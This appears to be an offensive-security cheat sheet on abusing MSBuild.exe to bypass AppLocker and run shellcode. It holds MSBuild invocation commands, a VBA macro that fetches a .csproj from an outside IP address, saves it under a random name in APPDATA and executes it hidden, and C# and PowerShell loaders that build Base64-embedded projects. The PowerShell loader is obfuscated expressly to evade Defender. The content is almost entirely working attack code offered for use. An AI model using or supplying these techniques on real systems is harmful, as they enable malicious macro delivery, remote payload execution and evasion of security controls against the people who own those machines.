## MSBuild
- https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/md/Msbuild.exe.md
- https://github.com/3gstudent/msbuild-inline-task/tree/master

Select from available templates in this directory.


```
# When Executing x86 shellcode
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe csproj.cs
C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe csproj.cs
C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe csproj.cs

# When Executing x64 shellcode
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe csproj.cs
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe csproj.cs
C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe csproj.cs
```

## Execute with Macro
Download from HTTP and execute on disk to bypass Applocker

```vba
Sub DownloadAndExecute()
    Const ADTYPEBINARY = 1, ADSAVECREATEOVERWRITE = 2
    Dim xHttp As Object, bStrm As Object
    Dim filename As String, appDataPath As String, msBuildPath As String

    appDataPath = Environ("APPDATA")
    filename = appDataPath & "\" & GenerateRandomFilename() & ".csproj.cs"
    
    msBuildPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe"

    Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xHttp.Open "GET", "http://192.168.45.216/clm.csproj", False
    xHttp.send

    If xHttp.Status = 200 Then
        Set bStrm = CreateObject("ADODB.Stream")
        bStrm.Type = ADTYPEBINARY
        bStrm.Open
        bStrm.Write xHttp.responseBody
        bStrm.SaveToFile filename, ADSAVECREATEOVERWRITE
        bStrm.Close
    End If

    Set bStrm = Nothing
    Set xHttp = Nothing

    Shell msBuildPath & " """ & filename & """", vbHide
    
    Wait 10
End Sub

Function GenerateRandomFilename() As String
    Dim i As Integer, randomStr As String
    Randomize
    For i = 1 To 16
        randomStr = randomStr & Chr(Int((26 * Rnd) + 65))
    Next i
    GenerateRandomFilename = randomStr
End Function

Sub Wait(seconds As Long)
    Dim endTime As Date: endTime = DateAdd("s", seconds, Now)
    Do While Now < endTime: DoEvents: Loop
End Sub
```
## Other methods for execution

Other ways to use MSBuild in some capacity for code execution. 

```csharp
using Microsoft.Build.Evaluation;

namespace MSBuild
{
    class Program
    {
        static void Main(string[] args)
        {
            // Can be used with a UNC path as well
            // also supports .xml extensions
            string file = @"C:\Users\student\Desktop\test.csproj";
            ProjectCollection collection = new ProjectCollection();
            collection.LoadProject(file).Build();

        }
    }
}
```
It is also possible to store the .xml / .csproj file in a Base64 string within the binary and execute
```csharp
using Microsoft.Build.Evaluation;
using System;
using System.IO;
using System.Text;
using System.Xml;

namespace MSBuild
{
    class Program
    {
        static void Main(string[] args)
        {
            // Base64 encoded .csproj or .xml goes here
            string base64Csproj = "PABQAHIAbwBqA=";

            byte[] decodedBytes = Convert.FromBase64String(base64Csproj);
            string csprojContent = Encoding.UTF8.GetString(decodedBytes);

            using (var stringReader = new StringReader(csprojContent))
            using (var xmlReader = XmlReader.Create(stringReader))
            {
                ProjectCollection projectCollection = new ProjectCollection();
                Project project = new Project(xmlReader, null, null, projectCollection);
                bool buildSucceeded = project.Build();
            }
        }
    }
}
```

Powershell can also be used
The .xml / .csproj file can be encoded with Cyberchef: 

https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')&ieol=CRLF

```powershell
# Reflective load obfuscated as Defender complains
# Original String: [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.Build');

Function Invoke-MSBuild {
    $b = "PABQAHIAbwBqA="
    $p = [System.Convert]::FromBase64String($b)
    $x = [System.Text.Encoding]::Unicode.GetString($p)
    $r = [System.Xml.XmlReader]::Create([System.IO.StringReader]::new($x))
    SeT  t7JD ([TYPE](('sYS'+'T')+'eM'+('.r'+'E'+'fLEctio')+('N'+'.As')+('SEMbl'+'y'))  );   $T7jD::LoadWithPartialName(('Mic'+'rosoft.Bu'+'il'+'d'));
    $n = New-Object Microsoft.Build.Evaluation.Project($r)
    $n.Build()
}

Invoke-MSBuild | Out-Null

```
